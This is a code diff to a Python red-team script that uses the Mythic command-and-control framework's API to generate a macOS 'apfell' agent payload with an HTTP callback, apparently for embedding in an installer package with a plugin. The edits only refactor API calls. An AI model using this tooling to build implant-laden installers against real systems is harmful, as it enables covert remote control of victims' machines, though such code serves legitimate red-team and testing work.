@@ -20,7 +20,7 @@ def install_plug():
 
     ## Create apfell payload
     async def scripting():
-        mythic = Mythic(
+        mythic = mythic_rest.Mythic(
             username=mythic_username,
             password=mythic_password,
             server_ip=mythic_server_ip,
@@ -32,17 +32,18 @@ def install_plug():
         await mythic.login()
         await mythic.set_or_create_apitoken()
         # define what our payload should be
-        p = Payload(
+        p = mythic_rest.Payload(
             # what payload type is it
             payload_type="apfell", 
             c2_profiles={
-                "HTTP":[
+                "http":[
                         {"name": "callback_host", "value": mythic_http_callback_host},
                         {"name": "callback_interval", "value": mythic_http_callback_interval}
                     ]
                 },
             # give our payload a description if we want
             tag="Installer Pkg with Plugin",
+            selected_os="macOS",
             # if we want to only include specific commands, put them here:
             #commands=["cmd1", "cmd2", "cmd3"],
             # what do we want the payload to be called
@@ -76,7 +77,7 @@ def install_plug():
         await scripting()
         try:
             while True:
-                pending = asyncio.all_tasks()
+                pending = mythic_rest.asyncio.all_tasks()
                 plist = []
                 for p in pending:
                     if p._coro.__name__ != "main" and p._state == "PENDING":
@@ -84,11 +85,11 @@ def install_plug():
                 if len(plist) == 0:
                     exit(0)
                 else:
-                    await asyncio.gather(*plist)
+                    await mythic_rest.asyncio.gather(*plist)
         except KeyboardInterrupt:
-            pending = asyncio.all_tasks()
+            pending = mythic_rest.asyncio.all_tasks()
             for t in pending:
                 t.cancel()    
 
-    loop = asyncio.get_event_loop()
+    loop = mythic_rest.asyncio.get_event_loop()
     loop.run_until_complete(main())
